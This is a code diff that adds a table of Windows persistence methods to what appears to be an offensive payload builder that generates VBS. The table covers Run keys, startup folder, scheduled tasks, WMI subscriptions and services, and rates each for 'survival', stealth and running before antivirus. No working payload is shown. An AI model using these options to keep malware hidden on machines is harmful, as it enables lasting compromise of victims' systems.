@@ -9,6 +9,58 @@ import random
 import string
 
 
+PERSISTENCE_INFO = {
+    "registry": {
+        "name": "Registry HKCU/HKLM Run Key",
+        "supports": "XP, Vista, 7, 8, 8.1, 10, 11",
+        "survival": "80%",
+        "advantages": ["Works on all Windows", "Simple", "Fast"],
+    },
+    "startup": {
+        "name": "Startup Folder",
+        "supports": "XP, Vista, 7, 8, 8.1, 10, 11",
+        "survival": "85%",
+        "advantages": ["Works on all Windows", "Survives safe mode", "Natural looking"],
+    },
+    "startup_folder": {
+        "name": "Startup Folder",
+        "supports": "XP, Vista, 7, 8, 8.1, 10, 11",
+        "survival": "85%",
+        "advantages": ["Works on all Windows", "Survives safe mode", "Natural looking"],
+    },
+    "task": {
+        "name": "Scheduled Tasks",
+        "supports": "Vista, 7, 8, 8.1, 10, 11",
+        "survival": "90%",
+        "advantages": ["Very stealthy", "Runs as SYSTEM", "Hard to detect"],
+    },
+    "scheduled_task": {
+        "name": "Scheduled Tasks",
+        "supports": "Vista, 7, 8, 8.1, 10, 11",
+        "survival": "90%",
+        "advantages": ["Very stealthy", "Runs as SYSTEM", "Hard to detect"],
+    },
+    "wmi": {
+        "name": "WMI Event Subscriptions",
+        "supports": "Vista, 7, 8, 8.1, 10, 11",
+        "survival": "95%",
+        "advantages": ["Extremely stealthy", "Before AV loads", "Hard to detect"],
+    },
+    "service": {
+        "name": "Windows Service",
+        "supports": "XP, Vista, 7, 8, 8.1, 10, 11",
+        "survival": "99%",
+        "advantages": ["Runs as SYSTEM", "Survives everything", "Highest privilege"],
+    },
+    "multi": {
+        "name": "Multiple Methods (Recommended)",
+        "supports": "XP, Vista, 7, 8, 8.1, 10, 11",
+        "survival": "99%+",
+        "advantages": ["Redundancy", "If one fails others activate", "Best survival"],
+    },
+}
+
+
 def _vbs_escape(s):
     """Escape double quotes for embedding in VBS string literals"""
     return s.replace('"', '""')
